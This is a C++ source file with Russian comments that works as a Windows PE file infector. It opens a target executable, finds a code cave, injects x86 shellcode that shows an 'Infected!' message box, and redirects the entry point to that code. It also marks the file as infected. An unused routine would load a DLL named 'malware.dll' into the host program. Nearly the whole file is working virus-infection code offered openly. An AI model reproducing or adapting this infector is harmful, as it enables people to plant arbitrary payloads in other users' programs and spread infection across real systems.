#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <iostream>

#define TARGET "C:\\Users\\Fox\\Desktop\\FirstInfected.exe"
#define SHELLCODE_SIZE 65

#define db(x) __asm _emit x

void __declspec(naked) dllshellcode()
{
	__asm
	{
		pushad
		call    routine
		routine :
		pop     ebp
			sub     ebp, offset routine

			lea     eax, [ebp + szPath]
			push    eax
			mov     eax, 0xAAAAAAAA // LoadLibrary адрес
			call    eax

			popad
			push    0xAAAAAAAA // Original Entry Point
			ret

			szPath :
		db('m')
			db('a')
			db('l')
			db('w')
			db('a')
			db('r')
			db('e')
			db('.')
			db('d')
			db('l')
			db('l')
			db(0)
	}
}

void __declspec(naked) shellcode()
{
	__asm {
		pushad // Сохраняем регистры
		call    routine // Получаем eip

		routine :
		pop     ebp // Получаем eip
			sub     ebp, offset routine // Получаем eip

			// Вызываем MessageBox
			push    0x00000010  // MB_ICONERROR
			lea     eax, [ebp + szCaption]
			push    eax // szCaption
			lea     eax, [ebp + szText]
			push    eax // szText
			push    0 // NULL
			mov     eax, 0xAAAAAAAA // Временный адрес MessageBox
			call    eax // Вызываем MessageBoxA
			popad // Получаем регистры обратно
			push    0xAAAAAAAA // Переходим на оригинальную точку входа
			ret // Переходим на оригинальную точку входа

			szText :
		db('I')
			db('n')
			db('f')
			db('e')
			db('c')
			db('t')
			db('e')
			db('d')
			db('!')
			db(0)
			szCaption:
		db('C')
			db('o')
			db('d')
			db('e')
			db('b')
			db('y')
			db('N')
			db('e')
			db('t')
			db(0)
	}
}

class MappedFile
{
private:
	HANDLE m_hFile;
	HANDLE m_hMapping;
	LPBYTE m_lpFile;
public:
	MappedFile(LPTSTR szFilename) // Этот конструктор вызывается при создании объекта этого класса, он принимает путь к файлу
	{
		m_hFile = CreateFile(szFilename, FILE_ALL_ACCESS, 0, NULL, OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL, NULL); // Открываем файл
		if (m_hFile == INVALID_HANDLE_VALUE) // Проверяем на ошибки
		{
			throw std::exception("Can't open target file!");
		}
		DWORD dwFileSize = GetFileSize(m_hFile, NULL); // Получаем размер файла

		m_hMapping = CreateFileMapping(m_hFile, NULL, PAGE_READWRITE, 0,
			0, NULL); // Создаём проекцию файла в память
		if (m_hMapping == NULL) // Проверяем на ошибки
		{
			CloseHandle(m_hFile);
			throw std::exception("Can't create file mapping!");
		}

		m_lpFile = LPBYTE(MapViewOfFile(m_hMapping, FILE_MAP_ALL_ACCESS, 0, 0, dwFileSize)); // Проецируем отображение файла
		if (m_lpFile == NULL) // Проверяем на ошибки
		{
			CloseHandle(m_hMapping);
			CloseHandle(m_hFile);
			throw std::exception("Can't map view of file!");
		}
	}

	LPBYTE getViewOfFile() // Метод для получения адреса на начало отображения файла в памяти
	{
		return m_lpFile;
	}

	~MappedFile() // Деструктор, вызывающийся при освобождении объекта
	{
		UnmapViewOfFile(m_lpFile); // Уничтожаем отображение проекции файла
		CloseHandle(m_hMapping); // Закрываем проекцию файла
		CloseHandle(m_hFile); // Закрываем файл
	}
};

class PEParser
{
private:
	LPBYTE m_lpFile;
	PIMAGE_DOS_HEADER m_pidh;
	PIMAGE_NT_HEADERS m_pinh;
	PIMAGE_FILE_HEADER m_pifh;
	PIMAGE_OPTIONAL_HEADER m_pioh;
public:
	PEParser(LPBYTE lpFile) : m_lpFile(lpFile)
	{
		m_pidh = PIMAGE_DOS_HEADER(lpFile); // Получаем DOS-заголовок (он самый первый)
		if (m_pidh->e_magic != IMAGE_DOS_SIGNATURE) // Проверяем, корректна ли сигнатура DOS заголовока
		{
			throw std::exception("There's not executable file!");
		}

		m_pinh = PIMAGE_NT_HEADERS(lpFile + m_pidh->e_lfanew); // Получаем PE-заголовок (NT)
		if (m_pinh->Signature != IMAGE_NT_SIGNATURE) // Проверяем, корректна ли сигнатура PE заголовока
		{
			throw std::exception("There's not executable file!");
		}

		m_pifh = PIMAGE_FILE_HEADER(&m_pinh->FileHeader); // Получаем файловый заголовок
		m_pioh = PIMAGE_OPTIONAL_HEADER(&m_pinh->OptionalHeader); // Получаем опциональный заголовок
	}

	// Методы ниже возвращают заголовки
	PIMAGE_DOS_HEADER getDosHeader()
	{
		return m_pidh;
	}

	PIMAGE_NT_HEADERS getNtHeaders()
	{
		return m_pinh;
	}

	PIMAGE_FILE_HEADER getFileHeader()
	{
		return m_pifh;
	}

	PIMAGE_OPTIONAL_HEADER getOptionalHeader()
	{
		return m_pioh;
	}

	// Метод, возвращающий число секций
	int getNumberOfSections()
	{
		return m_pifh->NumberOfSections;
	}

	// Этот метод возвращает заголовок по его индексу
	PIMAGE_SECTION_HEADER getSectionHeader(int nSection)
	{
		if (nSection > this->getNumberOfSections())
		{
			return NULL;
		}

		return PIMAGE_SECTION_HEADER(m_lpFile + m_pidh->e_lfanew +
			sizeof(m_pinh->Signature) + sizeof(IMAGE_FILE_HEADER) +
			m_pifh->SizeOfOptionalHeader +
			sizeof(IMAGE_SECTION_HEADER) * (nSection - 1));
	}
};

wchar_t* convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

BOOL isInfected(PIMAGE_DOS_HEADER pidh)
{
	return ((pidh->e_minalloc == 0x13) && (pidh->e_maxalloc == 0x37));
}

void markAsInfected(PIMAGE_DOS_HEADER pidh)
{
	pidh->e_minalloc = 0x13;
	pidh->e_maxalloc = 0x37;
}

typedef struct _CODE_CAVE
{
	DWORD                 dwPosition; // Смещение до пещеры кода относительно начала файла
	PIMAGE_SECTION_HEADER pish; // Указатель на секцию с пещерой кода
} CODE_CAVE, * PCODE_CAVE;

// Функция возвращающая структуру CODE_CAVE
CODE_CAVE findCodeCave(LPBYTE lpFile, PEParser* ppeParser)
{
	// Инициализируем переменные
	CODE_CAVE ccCave;

	DWORD     dwCount = 0;
	ccCave.dwPosition = 0;
	ccCave.pish = NULL;

	for (int i = 1; i <= ppeParser->getNumberOfSections(); i++)  // Итерируем секции
	{
		ccCave.pish = ppeParser->getSectionHeader(i);

		for (int j = 0; j < ccCave.pish->SizeOfRawData; j++) // Ищем пещеру кода
		{
			if (*(lpFile + ccCave.pish->PointerToRawData + j) == 0x00)
			{
				if (dwCount++ == (SHELLCODE_SIZE + 1))
				{
					ccCave.dwPosition = j - SHELLCODE_SIZE +
						ccCave.pish->PointerToRawData + 1;
					break;
				}
			}
			else
			{
				dwCount = 0;
			}
		}

		if (ccCave.dwPosition != 0)
		{
			break;
		}
	}

	if (dwCount == 0 || ccCave.dwPosition == 0) // Если пещера кода не найдена, возвращаем пустую структуру
	{
		return CODE_CAVE{ 0, NULL };
	}
	else
	{
		return ccCave;
	}
}

void modificateShellcode(LPVOID lpShellcode, DWORD dwOEP)
{
	HMODULE hModule = LoadLibrary(TEXT("user32.dll"));
	LPVOID lpMessageBoxA = GetProcAddress(hModule, "MessageBoxA");

	for (int i = 0; i < SHELLCODE_SIZE; i++)
	{
		if (*(LPDWORD(lpShellcode) + i) == 0xAAAAAAAA)
		{
			*(LPDWORD(lpShellcode) + i) = DWORD(lpMessageBoxA);
			FreeLibrary(hModule);
			break;
		}
	}

	for (int i = 0; i < SHELLCODE_SIZE; i++)
	{
		if (*(LPDWORD(lpShellcode) + i) == 0xAAAAAAAA)
		{
			*(LPDWORD(lpShellcode) + i) = dwOEP;
			break;
		}
	}
}

int main()
{
	MappedFile* pmfTarget;
	std::string str = "";
	try
	{
		pmfTarget = new MappedFile(convertCharArrayToLPCWSTR(TARGET));
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] " << e.what() << std::endl;
		std::cerr << "GetLastError(): " << GetLastError() << std::endl;
		return 1;
	}

	LPBYTE lpFile = pmfTarget->getViewOfFile();

	PEParser* ppeParser;
	try
	{
		ppeParser = new PEParser(lpFile);
	}
	catch (const std::exception& e)
	{
		std::cerr << "[ERROR] " << e.what() << std::endl;
		std::cerr << "GetLastError(): " << GetLastError() << std::endl;

		delete pmfTarget;
		return 1;
	}

	PIMAGE_DOS_HEADER      pidh = ppeParser->getDosHeader();
	PIMAGE_NT_HEADERS      pinh = ppeParser->getNtHeaders();
	PIMAGE_FILE_HEADER     pifh = ppeParser->getFileHeader();
	PIMAGE_OPTIONAL_HEADER pioh = ppeParser->getOptionalHeader();
	DWORD                  dwOEP = pioh->AddressOfEntryPoint + pioh->ImageBase;

	if (isInfected(pidh))
	{
		std::cerr << "[ERROR] File already infected!" << std::endl;

		delete ppeParser;
		delete pmfTarget;
		return 1;
	}

	CODE_CAVE ccCave = findCodeCave(lpFile, ppeParser);
	if ((ccCave.pish == NULL) || (ccCave.dwPosition == 0))
	{
		std::cerr << "[ERROR] Can't find code cave!" << std::endl;

		delete ppeParser;
		delete pmfTarget;
		return 1;
	}
	std::cout << "[INFO] Code cave located at 0x" << LPVOID(ccCave.dwPosition) << std::endl;
	PIMAGE_SECTION_HEADER pish = ccCave.pish;
	DWORD                 dwPosition = ccCave.dwPosition;

	LPVOID lpShellcode = new char[SHELLCODE_SIZE];
	RtlSecureZeroMemory(lpShellcode, SHELLCODE_SIZE);
	memcpy(lpShellcode, shellcode, SHELLCODE_SIZE);
	modificateShellcode(lpShellcode, dwOEP);

	memcpy(LPBYTE(lpFile + dwPosition), lpShellcode, SHELLCODE_SIZE);
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
	pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
	markAsInfected(pidh);

	std::cout << "[SUCCESS] File successfuly infected!" << std::endl;

	delete lpShellcode;
	delete ppeParser;
	delete pmfTarget;
	return 0;
}